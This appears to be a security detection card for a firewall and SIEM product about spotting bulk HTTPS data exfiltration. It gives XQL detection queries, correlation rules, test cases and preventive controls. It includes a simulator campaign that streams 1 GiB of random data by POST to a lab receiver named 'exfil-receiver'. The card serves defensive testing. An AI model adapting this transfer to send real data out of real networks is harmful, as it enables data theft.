identity.name: Bulk HTTPS Exfiltration — Sustained Outbound Bytes Exceeding Host Baseline (T1041 / T1567)
identity.summary: A non-server endpoint streams gigabytes outbound across a few long-lived HTTPS sessions to one external destination. The CortexSim bulk_https_exfil EAL plugin reproduces the shape against an authorised receiver: high bytes-out per session, an upload-skewed ratio, and multi-minute duration. NGFW EAL + XSIAM Network Security Analytics flag the volume and duration anomaly versus the host baseline.
identity.description: Volumetric data exfiltration over HTTPS is the dominant actions-on-objectives shape in modern double-extortion intrusions: the operator stages collected data then pushes it to attacker-controlled cloud storage or a drop server over TLS so the payload is opaque to inspection. The detectable surface is therefore not content but flow shape — a single internal source sustaining a very large outbound byte count to one external destination, with a bytes-out/bytes-in ratio far above any browsing baseline, across a session (or small set of chunked sessions) that stays open for minutes rather than seconds. This card detects the exfiltration purely from NGFW flow telemetry in panw_ngfw_traffic_raw / network_story: (1) a BIOC for total outbound bytes per source/destination greatly exceeding the host baseline within a time bin; (2) a BIOC for the long-lived, upload-skewed HTTPS session; (3) an IOC on the authorised lab receiver host so a DC can isolate the simulated egress during a POV; and (4) a correlation rule that stitches the NGFW session-volume anomaly with the originating XDR process so the SOC sees a single exfiltration incident with end-to-end causality rather than an isolated traffic spike. The bulk_https_exfil plugin charges a campaign-level cumulative byte budget and stamps every request with the operator telemetry headers, so the simulated transfer is bounded, attributable, and safe to replay in a customer lab.

execution.framework_reference_id: T1041 — CortexSim bulk_https_exfil EAL plugin (chunked large outbound HTTPS POST to authorised receiver)

prerequisites.description: Lab environment matching scenario SIM-NDR-005 requirements (NGFW inline forwarding outbound traffic logs to XSIAM; egress to the operator-supplied receiver host permitted).
NGFW forwards Enhanced Application Logs / traffic logs into XSIAM (panw_ngfw_traffic_raw / network_story carries app, src_ip, dst_ip, action_total_upload, action_total_download, session duration).

payload.code:
# Live bulk HTTPS exfil: stream 1 GiB random payload across 4 chunked POSTs to the authorised receiver.
cat > /tmp/bulk-exfil-live.yml <<'YML'
campaign_id: CMP-NDR-005
name: "NDR validation — bulk HTTPS exfil"
authorized_by: "domain-consultant@paloaltonetworks.com"
simulation_authorized: true
target_allowlist:
  - testmynids.org
dry_run: false
tags: [ndr, exfil, eal, https]
steps:
  - step_id: step-01
    plugin: bulk_https_exfil
    params:
      target_url: https://exfil-receiver.testmynids.org/upload
      total_bytes: 1073741824    # 1 GiB
      chunk_bytes: 4194304       # 4 MiB
      request_count: 4
      method: POST
      request_timeout: 600
YML
python3 -m scripts.eal_simulator.cli run /tmp/bulk-exfil-live.yml --live

expected_artifacts.description: Sustained outbound HTTPS sessions from one source to a single external destination carrying a very large total upload byte count within the run window.
Heavily upload-skewed flow — bytes-out far exceeds bytes-in for the session, atypical of normal browsing.
Long-lived HTTPS session(s) lasting minutes rather than seconds during the transfer.
Operator header X-Simulation-Run-ID present on every simulated request for POV filtering.

iocs.context: Authorised lab exfil receiver host. Not malicious on its own — lets the DC isolate the simulated bulk-HTTPS egress in panw_ngfw_traffic_raw during a POV. In a real environment substitute the customer-observed attacker-controlled drop host.

biocs.name: NGFW EAL outbound bytes per session greatly exceeds host baseline
biocs.description: Single internal source sustains a very large total outbound byte count to one external destination within a time bin, far above the host's browsing baseline — the volumetric exfiltration signature.
biocs.logic:
dataset = panw_ngfw_traffic_raw
| filter app in ("ssl", "web-browsing", "web-browsing-ssl")
| filter action = "allow"
| filter dst_ip != null and not incidr(dst_ip, "10.0.0.0/8") and not incidr(dst_ip, "172.16.0.0/12") and not incidr(dst_ip, "192.168.0.0/16")
| bin _time span = 5m
| comp sum(action_total_upload) as bytes_out, sum(action_total_download) as bytes_in, count() as sessions by src_ip, dst_ip, dst_host, _time
| filter bytes_out > 250000000 and (bytes_out / (bytes_in + 1)) > 10
| fields _time, src_ip, dst_ip, dst_host, sessions, bytes_out, bytes_in

biocs.name: NGFW EAL long-lived upload-skewed HTTPS session
biocs.description: Outbound HTTPS session that stays open for minutes with a heavily upload-skewed byte ratio — a single chunked transfer rather than interactive browsing.
biocs.logic:
dataset = panw_ngfw_traffic_raw
| filter app in ("ssl", "web-browsing", "web-browsing-ssl")
| filter action = "allow"
| filter session_duration > 120
| filter action_total_upload > 50000000 and (action_total_upload / (action_total_download + 1)) > 10
| comp count() as long_sessions, max(session_duration) as max_duration, sum(action_total_upload) as bytes_out by src_ip, dst_ip, dst_host
| filter long_sessions >= 1
| fields src_ip, dst_ip, dst_host, long_sessions, max_duration, bytes_out

xql_queries.name: Pre-flight bulk-exfil receiver reachable over HTTPS
xql_queries.query:
dataset = panw_ngfw_traffic_raw
| filter _time > to_timestamp(current_time() - 1800)
| filter app in ("ssl", "web-browsing", "web-browsing-ssl")
| filter dst_host = "exfil-receiver.testmynids.org"
| comp count() as sessions by src_ip, dst_host
| fields src_ip, dst_host, sessions

xql_queries.name: NGFW EAL large sustained outbound bytes to single destination
xql_queries.query:
dataset = panw_ngfw_traffic_raw
| filter _time > to_timestamp(current_time() - 1800)
| filter app in ("ssl", "web-browsing", "web-browsing-ssl")
| filter action = "allow"
| comp sum(action_total_upload) as bytes_out, sum(action_total_download) as bytes_in, count() as sessions by src_ip, dst_ip, dst_host
| filter bytes_out > 500000000 and (bytes_out / (bytes_in + 1)) > 10
| sort desc bytes_out
| fields src_ip, dst_ip, dst_host, sessions, bytes_out, bytes_in

xql_queries.name: NGFW EAL long-lived upload-skewed HTTPS session present
xql_queries.query:
dataset = panw_ngfw_traffic_raw
| filter _time > to_timestamp(current_time() - 1800)
| filter app in ("ssl", "web-browsing", "web-browsing-ssl")
| filter session_duration > 120
| filter action_total_upload > 50000000
| comp max(session_duration) as max_duration, sum(action_total_upload) as bytes_out by src_ip, dst_ip, dst_host
| filter max_duration > 120
| fields src_ip, dst_ip, dst_host, max_duration, bytes_out

xql_queries.name: Operator filter bulk-exfil simulation header isolates run
xql_queries.query:
dataset = panw_ngfw_traffic_raw
| filter _time > to_timestamp(current_time() - 1800)
| filter app in ("ssl", "web-browsing", "web-browsing-ssl")
| filter http_req_headers contains "X-Simulation-Run-ID"
| filter dst_host = "exfil-receiver.testmynids.org"
| comp sum(action_total_upload) as bytes_out by src_ip, dst_host
| fields src_ip, dst_host, bytes_out

correlation_rules.name: Bulk HTTPS Exfil Cross-Plane Stitch — NGFW Volume Anomaly Plus XDR Originating Process
correlation_rules.logic: BIOC(NGFW EAL outbound bytes per session greatly exceeds host baseline) AND (XQL(NGFW EAL large sustained outbound bytes to single destination) OR XDR(originating process on src_host)) on same src_host within 30m

products.evidence_query: dataset = panw_ngfw_traffic_raw | filter app in ("ssl","web-browsing") | comp sum(action_total_upload) as bytes_out by src_ip, dst_ip, dst_host | filter bytes_out > 500000000
preset = network_story | filter app in ("ssl","web-browsing") | comp sum(action_total_upload) as bytes_out by src_ip, dst_ip | filter bytes_out > 500000000
Playbook: block the outbound destination at the NGFW, isolate the source host, snapshot file-server access logs for the source, open a data-exfiltration DFIR ticket.

use_cases.name: Anomalous Outbound Bytes Detection via NGFW EAL
use_cases.description: Validate that NGFW EAL + XSIAM Network Security Analytics detect sustained bulk HTTPS upload exceeding the host baseline and stitch the session-volume anomaly to the originating process.

test_cases.objective: Sustained large outbound byte volume to a single destination is surfaced by Network Security Analytics.
preconditions: NGFW inline forwarding outbound traffic logs to XSIAM.
Egress to the operator-supplied receiver host permitted for the simulator host.
steps: Run SIM-NDR-005 step-02 (live bulk_https_exfil, 1 GiB across 4 chunked POSTs).
Inspect Network Security Analytics / network_story for the source IP.
success_criteria: XQL `NGFW EAL large sustained outbound bytes to single destination` returns >= 1 row with bytes_out > 500 MB.
BIOC `NGFW EAL outbound bytes per session greatly exceeds host baseline` matches the source.

test_cases.objective: Long-lived upload-skewed session and originating process stitch into one exfiltration incident.
success_criteria: BIOC `NGFW EAL long-lived upload-skewed HTTPS session` returns >= 1 row with max_duration > 120s.
Correlation `CR-NDR-0008` raises a single data-exfiltration incident for the source with the originating process in the causality chain.

preventive_controls: Enforce a default-deny egress policy; allow large outbound transfers only from sanctioned file-transfer hosts to approved destinations.
Apply DLP on outbound HTTPS to detect and block sensitive content leaving the environment.
Require an authenticated egress proxy for all outbound web traffic so volumetric uploads are attributable and policy-controlled.
detection_engineering: Baseline per-host outbound byte volume and per-destination cardinality; alert on hosts crossing N GB/hour outbound or far above their own baseline.
Score long-lived, upload-skewed HTTPS sessions to a single destination distinctly from interactive browsing.
Correlate the NGFW session-volume anomaly with the originating XDR process so the SOC investigates one exfiltration incident rather than a raw traffic spike.
